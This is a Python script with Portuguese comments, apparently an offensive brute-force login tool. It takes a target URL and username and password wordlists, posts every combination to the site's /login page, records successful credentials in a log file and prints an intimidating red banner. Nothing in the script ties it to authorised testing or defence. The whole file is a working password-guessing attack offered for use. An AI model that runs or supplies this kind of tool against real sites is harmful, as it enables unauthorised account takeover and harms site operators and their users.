import requests
import os
import random
import string
import logging

# Configuração de logging
logging.basicConfig(filename='log.txt', level=logging.INFO, format='%(asctime)s - %(levelname)s: %(message)s')

# Função para fazer tentativas de login com as senhas da wordlist
def tentar_logins(base_url, usernames, passwords):
    for username in usernames:
        for password in passwords:
            payload = {
                'username_field_name': username,
                'password_field_name': password,
            }

            try:
                # Faça a solicitação de login aqui usando a biblioteca 'requests'
                response = requests.post(base_url + '/login', data=payload)
                response.raise_for_status()

                # Verifique se o login foi bem-sucedido com base na resposta.
                # Você deve personalizar esta verificação com base na resposta real do site.
                if 'Bem-vindo' in response.text:
                    print(f'✅ Login bem-sucedido - Usuário: {username}, Senha: {password}')
                    logging.info(f'Login bem-sucedido - Usuário: {username}, Senha: {password}')
                    return

            except requests.exceptions.HTTPError as e:
                logging.warning(f'Erro ao fazer login - Usuário: {username}, Senha: {password}, Erro: {e}')
                pass
            except Exception as e:
                logging.error(f'Erro inesperado - Usuário: {username}, Senha: {password}, Erro: {e}')
                pass

# Função para exibir um banner vermelho assustador
def exibir_banner_vermelho():
    print("\033[91m" + "━━━━━╮╭━╮╭╮╭┳━━━")
    print("━━━━━┃┃╭╯╰╯┃┏━┓")
    print("━━━━━┃╰╯╭╮╰┫╰━╯")
    print("━━━━━╰━┻╯╰━┻━━━" + "\033[0m")

# Função para escolher o site
def escolher_site():
    base_url = input('Digite a base URL (exemplo: http://exemplo.com/): ')
    return base_url

# Função para gerar senhas aleatórias
def gerar_senhas(quantidade, comprimento):
    senhas = []
    caracteres = string.ascii_letters + string.digits + string.punctuation

    for _ in range(quantidade):
        senha = ''.join(random.choice(caracteres) for _ in range(comprimento))
        senhas.append(senha)

    return senhas

# Função para escolher o arquivo com usuários
def escolher_arquivo_usuarios():
    arquivo = input('Digite o caminho do arquivo com usuários: ')
    if os.path.exists(arquivo):
        with open(arquivo, 'r', encoding='latin-1') as file:
            lines = file.readlines()
        return lines
    else:
        print("Oops! O arquivo de usuários não foi encontrado. Certifique-se de fornecer o caminho correto.")
        return None

# Função para escolher o arquivo com senhas
def escolher_arquivo_senhas():
    arquivo = input('Digite o caminho do arquivo com senhas: ')
    if os.path.exists(arquivo):
        with open(arquivo, 'r', encoding='latin-1') as file:
            lines = file.readlines()
        return lines
    else:
        print("Oops! O arquivo de senhas não foi encontrado. Certifique-se de fornecer o caminho correto.")
        return None

# Exemplo de uso
if __name__ == "__main__":
    exibir_banner_vermelho()
    base_url = escolher_site()
    usernames = escolher_arquivo_usuarios()
    passwords = escolher_arquivo_senhas()

    if base_url and usernames and passwords:
        usernames = [line.strip() for line in usernames]
        passwords = [line.strip() for line in passwords]

        tentar_logins(base_url, usernames, passwords)

    print("🐾 Tentativas de login concluídas! Tenha um ótimo dia! 🐾")
    